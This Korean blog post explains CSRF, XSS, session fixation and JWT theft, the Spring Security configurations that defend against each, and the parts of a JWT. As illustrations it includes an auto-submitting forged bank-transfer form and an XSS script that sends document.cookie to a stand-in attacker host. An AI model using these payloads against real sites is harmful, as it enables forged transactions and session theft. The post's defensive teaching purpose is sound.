---
title: "Spring Security 주요 보안 공격과 JWT 구조 이해하기"
categories:
  - Backend
  - Security
tags:
  - Spring
  - SpringSecurity
  - CSRF
  - XSS
  - SessionFixation
  - JWT
  - Authentication
  - Authorization
  - WebSecurity
---

웹 애플리케이션에서 보안은 로그인 기능을 만드는 것만으로 끝나지 않는다.
사용자가 인증된 이후에도 요청 위조, 스크립트 삽입, 세션 탈취, 토큰 탈취 같은 공격이 발생할 수 있다.

특히 Spring 기반 웹 애플리케이션에서는 `Spring Security`가 많은 보호 기능을 제공하지만,
각 공격이 어떤 원리로 발생하는지 이해하지 못하면 설정을 잘못 끄거나 위험한 방식으로 인증을 구현할 수 있다.

이 글에서는 Spring 기반 웹 애플리케이션에서 자주 다루는 네 가지 보안 공격과 대응 전략을 정리한다.

```text
1. CSRF
2. XSS
3. Session Fixation
4. JWT 탈취
```

그리고 이어서 `JWT(JSON Web Token)`의 구조와 각 구성 요소의 역할을 살펴본다.

---

## 1. CSRF란?

`CSRF(Cross-Site Request Forgery)`는 사용자가 의도하지 않은 요청을 공격자가 대신 보내게 만드는 공격이다.
한국어로는 사이트 간 요청 위조라고 한다.

예를 들어 사용자가 은행 사이트에 로그인한 상태라고 가정해보자.
이때 공격자가 만든 악성 페이지에 사용자가 접속하면,
그 페이지가 은행 사이트로 송금 요청을 보낼 수 있다.

```html
<form action="https://bank.example.com/transfer" method="post">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="100000">
</form>
<script>
    document.forms[0].submit();
</script>
```

브라우저는 요청을 보낼 때 해당 도메인의 Cookie를 자동으로 포함한다.
따라서 사용자가 은행 사이트에 로그인되어 있다면,
공격자가 만든 요청에도 사용자의 Session Cookie가 함께 전송될 수 있다.

핵심은 다음과 같다.

```text
CSRF는 인증 정보를 훔치는 공격이 아니라,
이미 인증된 사용자의 브라우저를 이용해 원치 않는 요청을 보내는 공격이다.
```

---

## 2. CSRF 대응 전략

CSRF는 Cookie 기반 인증에서 특히 중요하다.
Session ID가 Cookie에 저장되고, 브라우저가 요청마다 Cookie를 자동으로 전송하기 때문이다.

대표적인 대응 방법은 `CSRF Token`이다.

서버는 사용자별로 예측하기 어려운 Token을 발급하고,
상태 변경 요청에는 이 Token을 함께 보내도록 요구한다.
공격자는 사용자의 Cookie는 자동으로 전송시킬 수 있어도,
정상 페이지에 포함된 CSRF Token 값은 알기 어렵다.

Spring Security는 기본적으로 CSRF 보호를 제공한다.
전통적인 Server Side Rendering 기반 애플리케이션에서는 CSRF 보호를 유지하는 것이 일반적이다.

```java
@Configuration
public class SecurityConfig {

    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
                .csrf(csrf -> csrf
                        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                )
                .build();
    }
}
```

`CookieCsrfTokenRepository.withHttpOnlyFalse()`는 JavaScript에서 CSRF Token을 읽어 Header에 담아 보낼 수 있게 할 때 사용한다.
SPA 환경에서 자주 사용된다.

반대로 JWT를 `Authorization` Header에 담아 보내는 Stateless API라면 CSRF 위험이 상대적으로 낮다.
브라우저가 `Authorization` Header를 자동으로 붙여주지 않기 때문이다.

하지만 JWT를 Cookie에 저장한다면 다시 CSRF 위험이 생길 수 있다.
이때는 CSRF Token, `SameSite` Cookie, 중요 요청에 대한 재인증 등을 함께 고려해야 한다.

```text
Session Cookie 기반 인증 = CSRF 보호 필요
Authorization Header 기반 JWT = CSRF 위험 상대적으로 낮음
JWT를 Cookie에 저장 = CSRF 보호 다시 고려 필요
```

---

## 3. XSS란?

`XSS(Cross-Site Scripting)`는 공격자가 웹 페이지에 악성 Script를 삽입해
사용자의 브라우저에서 실행되도록 만드는 공격이다.

예를 들어 게시글 댓글에 다음과 같은 값이 저장된다고 가정해보자.

```html
<script>
    fetch("https://attacker.example.com/steal?cookie=" + document.cookie);
</script>
```

서버가 이 값을 적절히 이스케이프하지 않고 그대로 HTML에 출력하면,
다른 사용자가 댓글을 보는 순간 Script가 실행될 수 있다.

XSS는 크게 다음 유형으로 나눌 수 있다.

- Stored XSS: 악성 Script가 DB에 저장된 뒤 다른 사용자에게 실행됨
- Reflected XSS: 요청 파라미터에 담긴 악성 Script가 응답에 반사되어 실행됨
- DOM-based XSS: Client Side JavaScript가 DOM을 조작하는 과정에서 실행됨

XSS가 위험한 이유는 사용자의 브라우저 안에서 실행된다는 점이다.
공격자는 사용자의 권한으로 화면을 조작하거나, Token을 훔치거나, 임의 요청을 보낼 수 있다.

---

## 4. XSS 대응 전략

XSS 대응의 핵심은 출력 시점의 안전한 처리다.
사용자 입력값을 신뢰하지 않고, HTML에 출력할 때 반드시 Escape해야 한다.

Thymeleaf를 사용한다면 일반적으로 `th:text`는 HTML Escape를 수행한다.

```html
<p th:text="${comment.content}"></p>
```

반면 `th:utext`는 HTML을 그대로 출력하므로 주의해야 한다.

```html
<p th:utext="${comment.content}"></p>
```

사용자 입력을 HTML로 허용해야 하는 경우에는 전체 허용이 아니라,
허용할 Tag와 Attribute를 제한하는 Sanitizing이 필요하다.

일반적인 대응 전략은 다음과 같다.

- 사용자 입력값 검증
- HTML 출력 시 Escape
- 위험한 HTML 허용 시 Sanitizer 사용
- Cookie에 `HttpOnly` 설정
- `Content-Security-Policy(CSP)` 설정

Cookie에 `HttpOnly`를 설정하면 JavaScript에서 Cookie를 읽을 수 없다.
XSS 자체를 막는 것은 아니지만, Session ID 탈취 피해를 줄일 수 있다.

```http
Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax
```

`CSP`는 브라우저가 허용된 Script만 실행하도록 제한하는 보안 정책이다.
완벽한 해결책은 아니지만 XSS 피해를 줄이는 데 도움이 된다.

```http
Content-Security-Policy: script-src 'self'
```

Spring Security에서도 Header 설정을 통해 보안 Header를 구성할 수 있다.

```java
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
            .headers(headers -> headers
                    .contentSecurityPolicy(csp -> csp
                            .policyDirectives("script-src 'self'")
                    )
            )
            .build();
}
```

---

## 5. 세션 고정 공격이란?

`Session Fixation`은 공격자가 미리 알고 있는 Session ID를 사용자에게 사용하게 만든 뒤,
사용자가 로그인하면 그 Session ID로 공격자가 접근하는 공격이다.

흐름을 단순화하면 다음과 같다.

```text
1. 공격자가 특정 Session ID를 준비한다.
2. 사용자가 그 Session ID를 가진 상태로 사이트에 접속하도록 유도한다.
3. 사용자가 로그인한다.
4. 서버가 로그인 후에도 같은 Session ID를 유지한다.
5. 공격자는 알고 있던 Session ID로 로그인된 사용자처럼 접근한다.
```

핵심 문제는 로그인 전과 로그인 후의 Session ID가 그대로 유지되는 것이다.

---

## 6. 세션 고정 대응 전략

세션 고정 공격의 대표적인 대응 방법은 로그인 성공 시 Session ID를 새로 발급하는 것이다.

Spring Security는 기본적으로 로그인 성공 후 Session ID를 변경해 세션 고정 공격을 방어한다.
명시적으로 설정하면 다음과 같다.

```java
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
            .sessionManagement(session -> session
                    .sessionFixation(sessionFixation -> sessionFixation
                            .migrateSession()
                    )
            )
            .build();
}
```

주요 옵션은 다음과 같다.

| 옵션 | 설명 |
| --- | --- |
| `migrateSession()` | 새 Session을 만들고 기존 Session Attribute를 복사 |
| `changeSessionId()` | 기존 Session은 유지하면서 Session ID만 변경 |
| `newSession()` | 새 Session을 만들고 기존 Attribute는 복사하지 않음 |
| `none()` | 세션 고정 보호 비활성화 |

실무에서는 기본 설정을 유지하는 것이 대부분 안전하다.
특별한 이유 없이 `none()`으로 끄면 안 된다.

추가로 다음 설정도 함께 고려해야 한다.

- HTTPS 사용
- Cookie `HttpOnly`, `Secure`, `SameSite` 설정
- Session Timeout 설정
- 로그인 성공 후 중요 정보 재검증

---

## 7. JWT 탈취란?

`JWT 탈취`는 공격자가 사용자의 JWT를 훔쳐서,
그 Token을 이용해 사용자처럼 API를 호출하는 공격이다.

JWT는 보통 다음 Header에 담겨 전송된다.

```http
Authorization: Bearer access-token
```

JWT 기반 인증에서는 서버가 요청마다 Token의 Signature와 만료 시간을 검증한다.
문제는 유효한 JWT를 공격자가 손에 넣으면,
Token이 만료되기 전까지 공격자도 정상 사용자처럼 요청할 수 있다는 점이다.

JWT는 다음 경로로 탈취될 수 있다.

- XSS로 Local Storage의 Token 탈취
- HTTPS 미사용으로 네트워크 구간에서 탈취
- 로그에 Token이 남아 유출
- Refresh Token 저장소 관리 부실
- 악성 앱이나 브라우저 확장 프로그램에 의한 탈취

---

## 8. JWT 탈취 대응 전략

JWT 탈취는 완전히 막기 어렵기 때문에,
탈취 가능성을 줄이고 탈취되더라도 피해 시간을 줄이는 전략이 필요하다.

대표적인 대응 방법은 다음과 같다.

- HTTPS 필수 사용
- Access Token 만료 시간 짧게 설정
- Refresh Token은 더 안전한 저장소에 보관
- Refresh Token Rotation 적용
- 탈취 의심 시 Token 무효화
- JWT를 로그에 남기지 않기
- JWT Payload에 민감 정보 넣지 않기

Access Token은 짧게 유지하고, Refresh Token으로 재발급하는 구조를 많이 사용한다.

```text
Access Token = API 접근용, 짧은 만료 시간
Refresh Token = Access Token 재발급용, 긴 만료 시간
```

Refresh Token Rotation은 Refresh Token을 사용할 때마다 새 Refresh Token을 발급하고,
이전 Refresh Token은 폐기하는 방식이다.
이미 사용된 Refresh Token이 다시 들어오면 탈취 가능성을 의심할 수 있다.

JWT를 어디에 저장할지도 중요하다.

| 저장 위치 | 장점 | 주의점 |
| --- | --- | --- |
| Local Storage | 구현이 단순함 | XSS에 취약 |
| Session Storage | 탭 종료 시 사라짐 | XSS에 취약 |
| HttpOnly Cookie | JavaScript로 읽기 어려움 | CSRF 대응 필요 |

정답은 하나가 아니다.
서비스 구조, 클라이언트 종류, CSRF/XSS 대응 수준에 따라 선택해야 한다.

Spring Security에서는 JWT 검증 Filter를 두어 요청마다 Token을 검증하는 방식이 일반적이다.

```java
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain
    ) throws ServletException, IOException {
        String token = resolveToken(request);

        if (token != null && jwtProvider.validateToken(token)) {
            Authentication authentication = jwtProvider.getAuthentication(token);
            SecurityContextHolder.getContext().setAuthentication(authentication);
        }

        filterChain.doFilter(request, response);
    }
}
```

여기서 중요한 점은 Token 검증에 실패했을 때 인증 상태를 만들면 안 된다는 것이다.
또한 예외 응답, 만료 처리, 재발급 흐름을 명확히 분리해야 한다.

---

## 9. JWT 구조

`JWT(JSON Web Token)`는 JSON 정보를 안전하게 전달하기 위한 Token 형식이다.

JWT는 세 부분으로 구성된다.

```text
Header.Payload.Signature
```

실제 JWT는 다음처럼 점(`.`)으로 구분된 문자열 형태다.

```text
xxxxx.yyyyy.zzzzz
```

각 부분은 `Base64Url` 방식으로 인코딩된다.
주의할 점은 Base64Url은 암호화가 아니라 인코딩이라는 점이다.
즉, Payload는 누구나 디코딩해서 내용을 볼 수 있다.

```text
JWT Payload에 비밀번호, 주민등록번호, 카드번호 같은 민감 정보를 넣으면 안 된다.
```

---

## 10. Header

`Header`는 Token의 타입과 서명 알고리즘 정보를 담는다.

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

각 필드의 의미는 다음과 같다.

| 필드 | 설명 |
| --- | --- |
| `typ` | Token 타입. 일반적으로 `JWT` |
| `alg` | Signature 생성에 사용할 알고리즘 |

`alg`에는 `HS256`, `RS256` 같은 값이 들어갈 수 있다.

`HS256`은 하나의 Secret Key로 서명과 검증을 모두 수행하는 대칭키 방식이다.
`RS256`은 Private Key로 서명하고 Public Key로 검증하는 비대칭키 방식이다.

서버는 Header의 알고리즘을 참고해 Signature를 검증한다.
단, 공격자가 Header를 조작할 수 있으므로 서버에서 허용할 알고리즘을 명확히 제한해야 한다.

---

## 11. Payload

`Payload`는 Token에 담을 Claim 정보를 포함한다.
Claim은 사용자 정보나 Token의 속성을 나타내는 데이터다.

```json
{
  "sub": "123",
  "name": "seongjun",
  "role": "ROLE_USER",
  "iat": 1780297200,
  "exp": 1780300800
}
```

Claim은 크게 세 종류로 나눌 수 있다.

| 종류 | 설명 |
| --- | --- |
| Registered Claim | 표준으로 정의된 Claim |
| Public Claim | 공개적으로 사용되는 Claim |
| Private Claim | 서비스에서 직접 정의한 Claim |

자주 사용되는 Registered Claim은 다음과 같다.

| Claim | 의미 |
| --- | --- |
| `iss` | Issuer, Token 발급자 |
| `sub` | Subject, Token의 주체 |
| `aud` | Audience, Token 대상자 |
| `exp` | Expiration Time, 만료 시간 |
| `nbf` | Not Before, 이 시간 전에는 사용 불가 |
| `iat` | Issued At, 발급 시간 |
| `jti` | JWT ID, Token 고유 식별자 |

Payload에는 필요한 최소 정보만 넣는 것이 좋다.
권한 정보나 사용자 식별자 정도는 사용할 수 있지만,
민감 정보나 자주 바뀌는 정보는 넣지 않는 편이 안전하다.

예를 들어 사용자의 권한이 변경되었는데 기존 JWT가 아직 만료되지 않았다면,
Token 안의 권한 정보와 실제 DB의 권한 정보가 달라질 수 있다.

---

## 12. Signature

`Signature`는 Token이 위조되지 않았는지 검증하기 위한 값이다.

Signature는 일반적으로 다음 방식으로 만들어진다.

```text
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

서버는 요청으로 받은 JWT의 Header와 Payload를 이용해 Signature를 다시 계산한다.
그리고 요청에 포함된 Signature와 서버가 계산한 Signature가 일치하는지 확인한다.

일치하면 Token이 발급 이후 변경되지 않았다고 판단할 수 있다.
일치하지 않으면 중간에 Header나 Payload가 조작된 것이다.

중요한 점은 Signature가 Payload를 숨겨주는 것이 아니라는 점이다.

```text
Signature = 위조 여부 검증
암호화 = 내용 숨김
```

JWT는 기본적으로 서명된 Token이지 암호화된 Token이 아니다.
따라서 Signature가 있어도 Payload 내용은 볼 수 있다.

---

## 13. JWT 인증 흐름

JWT 기반 인증 흐름은 보통 다음과 같다.

```text
1. 사용자가 ID/PW로 로그인한다.
2. 서버가 사용자 정보를 검증한다.
3. 서버가 Access Token과 Refresh Token을 발급한다.
4. 클라이언트가 Access Token을 저장한다.
5. API 요청 시 Authorization Header에 Access Token을 담는다.
6. 서버가 JWT Signature, 만료 시간, 권한 정보를 검증한다.
7. 검증에 성공하면 SecurityContext에 Authentication을 저장한다.
8. Controller에서 인증된 사용자로 요청을 처리한다.
```

Spring Security에서는 JWT가 유효하다고 판단되면,
`SecurityContextHolder`에 `Authentication` 객체를 저장한다.
이후 Controller나 Service에서는 현재 인증된 사용자 정보를 조회할 수 있다.

```java
Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
```

단, Stateless 인증에서는 요청마다 JWT를 다시 검증해야 한다.
서버가 Session처럼 로그인 상태를 저장하지 않기 때문이다.

---

## 14. 보안 공격 대응 정리

네 가지 공격과 대응 전략을 정리하면 다음과 같다.

| 공격 | 핵심 원리 | 대응 전략 |
| --- | --- | --- |
| CSRF | 인증된 브라우저가 원치 않는 요청을 보내게 만듦 | CSRF Token, SameSite Cookie, 중요 요청 재인증 |
| XSS | 악성 Script를 사용자 브라우저에서 실행 | Escape, Sanitizing, HttpOnly Cookie, CSP |
| Session Fixation | 공격자가 아는 Session ID로 로그인 상태를 고정 | 로그인 성공 시 Session ID 변경, Spring Security 기본 보호 유지 |
| JWT 탈취 | 유효한 Token을 훔쳐 사용자처럼 요청 | HTTPS, 짧은 만료 시간, Refresh Token Rotation, 로그 마스킹 |

면접에서는 다음처럼 답변할 수 있다.

```text
CSRF는 사용자의 인증된 브라우저를 이용해 의도하지 않은 요청을 보내는 공격이고,
CSRF Token이나 SameSite Cookie로 대응합니다.

XSS는 악성 Script를 페이지에 삽입해 사용자 브라우저에서 실행시키는 공격이며,
출력 Escape, Sanitizing, HttpOnly Cookie, CSP로 대응합니다.

세션 고정은 로그인 전 Session ID가 로그인 후에도 유지될 때 발생하며,
Spring Security는 기본적으로 로그인 성공 시 Session ID를 변경해 방어합니다.

JWT 탈취는 유효한 Token을 공격자가 가져가 API를 호출하는 문제이므로,
HTTPS, 짧은 Access Token 만료 시간, Refresh Token Rotation,
Token 저장소 보안, 로그 마스킹이 필요합니다.
```

---

## 마무리

Spring Security는 많은 보안 기능을 기본으로 제공하지만,
보안 설정을 이해하지 못한 채 끄면 취약점이 생길 수 있다.

Cookie 기반 인증에서는 `CSRF`와 `Session Fixation`을 특히 신경 써야 하고,
사용자 입력을 화면에 출력하는 서비스에서는 `XSS` 방어가 중요하다.
JWT 기반 인증에서는 Token이 탈취되었을 때의 피해를 줄이는 설계가 필요하다.

JWT는 `Header`, `Payload`, `Signature` 세 부분으로 구성된다.
`Header`는 타입과 알고리즘, `Payload`는 Claim, `Signature`는 위조 여부 검증을 담당한다.
단, JWT는 암호화가 아니라 인코딩된 구조이므로 Payload에 민감 정보를 넣으면 안 된다.

보안은 한 가지 설정으로 끝나는 것이 아니라,
인증 방식, Token 저장 위치, Cookie 정책, 로그 관리, 입력값 처리까지 함께 설계해야 한다.

---
